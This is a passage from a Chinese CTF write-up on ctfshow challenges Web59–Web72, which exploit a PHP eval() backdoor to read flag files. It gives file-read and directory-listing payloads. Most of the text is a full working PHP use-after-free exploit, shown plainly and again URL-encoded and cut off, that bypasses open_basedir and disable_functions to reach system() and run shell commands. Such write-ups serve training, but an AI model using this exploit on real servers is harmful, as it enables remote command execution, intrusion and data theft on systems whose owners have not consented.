"r"),"%s"));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span></code></pre><h1 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h1><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php/*<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST['c']))&amp;#123;        $c= $_POST['c'];        eval($c);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; </span></code></pre><p>代码没变，估计应该是禁用了一些函数 还是show_source</p><h1 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h1><p>从这里开始一直到web65都可以用<code>show_source</code>通杀</p><h1 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h1><p>show_source终于被禁用了，使用highlight_file</p><p>提示一句文件在根目录</p><p>Payload:</p><pre class=" language-bash"><code class="language-bash">?c<span class="token operator">=</span>highlight_file<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h1><p>同上</p><h1 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h1><p>爆出根目录下文件情况</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>var_dump<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">))</span><span class="token punctuation">;</span></code></pre><p><code>highlight_file</code>被禁用了那就上<code>include</code></p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>include<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web69"><a href="#Web69" class="headerlink" title="Web69"></a>Web69</h1><p><code>highlight_file()</code>继续被禁用，使用<code>var_dump</code>发现继续被禁用，找一下资料发现几种读取目录的方式</p><pre class=" language-php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 列当前目录print_r(glob("/*")); // 列根目录print_r(scandir("."));print_r(scandir("/"));$d=opendir(".");while(false!==($f=readdir($d)))&amp;#123;echo"$f\n";&amp;#125;$d=dir(".");while(false!==($f=$d->read()))&amp;#123;echo$f."\n";&amp;#125;$a=glob("/*");foreach($a as $value)&amp;#123;echo $value."   ";&amp;#125;$a=new DirectoryIterator('glob:///*');foreach($a as $f)&amp;#123;echo($f->__toString()." ");&amp;#125;</span></code></pre><p>前面4个print_r都被禁用了，我们使用后面四个任意一个都可以，原理是通过遍历数组的形式进行读取</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$d</span><span class="token operator">=</span>opendir<span class="token punctuation">(</span><span class="token string">"../../../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>while<span class="token punctuation">(</span>false<span class="token operator">!=</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">=</span>readdir<span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo"$f\n";&amp;#125;</span></code></pre><p>得到根目录下还是flag.txt，那直接上payload</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>include<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h1><p>同上</p><h1 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 你们在炫技吗？if(isset($_POST['c']))&amp;#123;        $c= $_POST['c'];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace("/[0-9]|[a-z]/i","?",$s);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;?>你要上天吗？</span></code></pre><p>输出了一堆<code>?</code>号，看到源码中最后有个匹配，匹配到数字字母就会被替换成<code>?</code>号，不过因为这个语句是放在eval()函数后面的，我们直接加个强行退出命令即可，payload如下</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>include<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h1><p>目录遍历payload</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span>new DirectoryIterator<span class="token punctuation">(</span><span class="token string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>foreach<span class="token punctuation">(</span><span class="token variable">$a</span> as <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo($f->__toString()." ");&amp;#125;;exit();</span></code></pre><p>发现flag在flag0.txt，继续include执行，发现被禁用，然后发现open_basedir和disable_functions的限制</p><blockquote><p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p><p>disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p></blockquote><p>找到了群主发出的exp</p><p>exp</p><pre class=" language-php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;    global $abc, $helper, $backtrace;    class Vuln &amp;#123;        public $a;        public function __destruct() &amp;#123;             global $backtrace;             unset($this->a);            $backtrace = (new Exception)->getTrace();            if(!isset($backtrace[1][</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                $backtrace = debug_backtrace();            &amp;#125;        &amp;#125;    &amp;#125;    class Helper &amp;#123;        public $a, $b, $c, $d;    &amp;#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &amp;#123;        $address = 0;        for($j = $s-1; $j >= 0; $j--) &amp;#123;            $address </span><span class="token markup">&lt;&lt;= 8;            $address |= ord($str[$p+$j]);        <span class="token entity" title="&#125;">&amp;#125;</span>        return $address;    <span class="token entity" title="&#125;">&amp;#125;</span>    function ptr2str($ptr, $m = 8) <span class="token entity" title="&#123;">&amp;#123;</span>        $out = "";        for ($i=0; $i &lt; $m; $i++) <span class="token entity" title="&#123;">&amp;#123;</span>            $out .= sprintf("%c",($ptr &amp; 0xff));            $ptr ></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;        return $out;    &amp;#125;    function write(&amp;$str, $p, $v, $n = 8) &amp;#123;        $i = 0;        for($i = 0; $i </span><span class="token markup">&lt; $n; $i++) <span class="token entity" title="&#123;">&amp;#123;</span>            $str[$p + $i] = sprintf("%c",($v &amp; 0xff));            $v ></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    &amp;#125;    function leak($addr, $p = 0, $s = 8) &amp;#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper->a);        if($s != 8) &amp;#123; $leak %= 2 </span><span class="token markup">&lt;&lt; ($s * 8) - 1; <span class="token entity" title="&#125;">&amp;#125;</span>        return $leak;    <span class="token entity" title="&#125;">&amp;#125;</span>    function parse_elf($base) <span class="token entity" title="&#123;">&amp;#123;</span>        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) <span class="token entity" title="&#123;">&amp;#123;</span>            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) <span class="token entity" title="&#123;">&amp;#123;</span>                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            <span class="token entity" title="&#125;">&amp;#125;</span> else if($p_type == 1 &amp;&amp; $p_flags == 5) <span class="token entity" title="&#123;">&amp;#123;</span>                 $text_size = $p_memsz;            <span class="token entity" title="&#125;">&amp;#125;</span>        <span class="token entity" title="&#125;">&amp;#125;</span>        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    <span class="token entity" title="&#125;">&amp;#125;</span>    function get_basic_funcs($base, $elf) <span class="token entity" title="&#123;">&amp;#123;</span>        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) <span class="token entity" title="&#123;">&amp;#123;</span>            $leak = leak($data_addr, $i * 8);            if($leak - $base ></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token markup">&lt; $data_addr - $base) <span class="token entity" title="&#123;">&amp;#123;</span>                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            <span class="token entity" title="&#125;">&amp;#125;</span> else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base ></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token markup">&lt; $data_addr - $base) <span class="token entity" title="&#123;">&amp;#123;</span>                $deref = leak($leak);                                if($deref != 0x786568326e6962)                    continue;            <span class="token entity" title="&#125;">&amp;#125;</span> else continue;            return $data_addr + $i * 8;        <span class="token entity" title="&#125;">&amp;#125;</span>    <span class="token entity" title="&#125;">&amp;#125;</span>    function get_binary_base($binary_leak) <span class="token entity" title="&#123;">&amp;#123;</span>        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) <span class="token entity" title="&#123;">&amp;#123;</span>            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) <span class="token entity" title="&#123;">&amp;#123;</span>                return $addr;            <span class="token entity" title="&#125;">&amp;#125;</span>        <span class="token entity" title="&#125;">&amp;#125;</span>    <span class="token entity" title="&#125;">&amp;#125;</span>    function get_system($basic_funcs) <span class="token entity" title="&#123;">&amp;#123;</span>        $addr = $basic_funcs;        do <span class="token entity" title="&#123;">&amp;#123;</span>            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) <span class="token entity" title="&#123;">&amp;#123;</span>                return leak($addr + 8);            <span class="token entity" title="&#125;">&amp;#125;</span>            $addr += 0x20;        <span class="token entity" title="&#125;">&amp;#125;</span> while($f_entry != 0);        return false;    <span class="token entity" title="&#125;">&amp;#125;</span>    function trigger_uaf($arg) <span class="token entity" title="&#123;">&amp;#123;</span>        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');        $vuln = new Vuln();        $vuln-></span>a <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    if(stristr(PHP_OS, </span><span class="token string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;        die(</span><span class="token string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i </span><span class="token markup">&lt; $n_alloc; $i++)        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');    trigger_uaf('x');    $abc = $backtrace[1]['args'][0];    $helper = new Helper;    $helper-></span>b <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; &amp;#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &amp;#123;        die(</span><span class="token string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &amp;#123;        die(</span><span class="token string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    if(!($elf = parse_elf($base))) &amp;#123;        die(</span><span class="token string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &amp;#123;        die(</span><span class="token string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    if(!($zif_system = get_system($basic_funcs))) &amp;#123;        die(</span><span class="token string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i </span><span class="token markup">&lt; 0x110; $i += 8) <span class="token entity" title="&#123;">&amp;#123;</span>        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    <span class="token entity" title="&#125;">&amp;#125;</span>    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-></span>b<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;ctfshow(</span><span class="token string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#需要通过url编码哦</span></code></pre><p>编码后的exp</p><pre class=" language-bash"><code class="language-bash">c<span class="token operator">=</span>function%20ctfshow<span class="token punctuation">(</span>%24cmd<span class="token punctuation">)</span>%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct<span class="token punctuation">(</span><span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset<span class="token punctuation">(</span>%24this-%3ea<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20<span class="token punctuation">(</span>new%20exception<span class="token punctuation">)</span>-%3egettrace<span class="token punctuation">(</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span><span class="token operator">!</span>isset<span class="token punctuation">(</span>%24backtrace%5b1%5d%5b<span class="token string">'args'</span>%5d<span class="token punctuation">))</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace<span class="token punctuation">(</span><span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr<span class="token punctuation">(</span>%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for<span class="token punctuation">(</span>%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord<span class="token punctuation">(</span>%24str%5b%24p%2b%24j%5d<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str<span class="token punctuation">(</span>%24ptr%2c%20%24m%20%3d%208<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20<span class="token punctuation">(</span>%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf<span class="token punctuation">(</span>%22%25c%22%2c<span class="token punctuation">(</span>%24ptr%20%26%200xff<span class="token punctuation">))</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write<span class="token punctuation">(</span>%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf<span class="token punctuation">(</span>%22%25c%22%2c<span class="token punctuation">(</span>%24v%20%26%200xff<span class="token punctuation">))</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak<span class="token punctuation">(</span>%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write<span class="token punctuation">(</span>%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen<span class="token punctuation">(</span>%24helper-%3ea<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24s%20<span class="token operator">!</span>%3d%208<span class="token punctuation">)</span>%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20<span class="token punctuation">(</span>%24s%20*%208<span class="token punctuation">)</span>%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf<span class="token punctuation">(</span>%24base<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak<span class="token punctuation">(</span>%24base%2c%200x10%2c%202<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak<span class="token punctuation">(</span>%24base%2c%200x20<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak<span class="token punctuation">(</span>%24base%2c%200x36%2c%202<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak<span class="token punctuation">(</span>%24base%2c%200x38%2c%202<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak<span class="token punctuation">(</span>%24header%2c%200%2c%204<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak<span class="token punctuation">(</span>%24header%2c%204%2c%204<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak<span class="token punctuation">(</span>%24header%2c%200x10<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak<span class="token punctuation">(</span>%24header%2c%200x28<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%20%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if<span class="token punctuation">(</span>%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span><span class="token operator">!</span>%24data_addr%20%7c%7c%20<span class="token operator">!</span>%24text_size%20%7c%7c%20<span class="token operator">!</span>%24data_size<span class="token punctuation">)</span>%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs<span class="token punctuation">(</span>%24base%2c%20%24elf<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20list<span class="token punctuation">(</span>%24data_addr%2c%20%24text_size%2c%20%24data_size<span class="token punctuation">)</span>%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak<span class="token punctuation">(</span>%24data_addr%2c%20%24i%20*%208<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak<span class="token punctuation">(</span>%24leak<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24deref%20<span class="token operator">!</span>%3d%200x746e6174736e6f63<span class="token punctuation">)</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak<span class="token punctuation">(</span>%24data_addr%2c%20<span class="token punctuation">(</span>%24i%20%2b%204<span class="token punctuation">)</span>%20*%208<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak<span class="token punctuation">(</span>%24leak<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24deref%20<span class="token operator">!</span>%3d%200x786568326e6962<span class="token punctuation">)</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base<span class="token punctuation">(</span>%24binary_leak<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for<span class="token punctuation">(</span>%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak<span class="token punctuation">(</span>%24addr%2c%200%2c%207<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24leak%20%3d%3d%200x10102464c457f<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system<span class="token punctuation">(</span>%24basic_funcs<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak<span class="token punctuation">(</span>%24addr<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak<span class="token punctuation">(</span>%24f_entry%2c%200%2c%206<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if<span class="token punctuation">(</span>%24f_name%20%3d%3d%200x6d6574737973<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak<span class="token punctuation">(</span>%24addr%20%2b%208<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while<span class="token punctuation">(</span>%24f_entry%20<span class="token operator">!</span>%3d%200<span class="token punctuation">)</span>%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf<span class="token punctuation">(</span>%24arg<span class="token punctuation">)</span>%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle<span class="token punctuation">(</span><span class="token 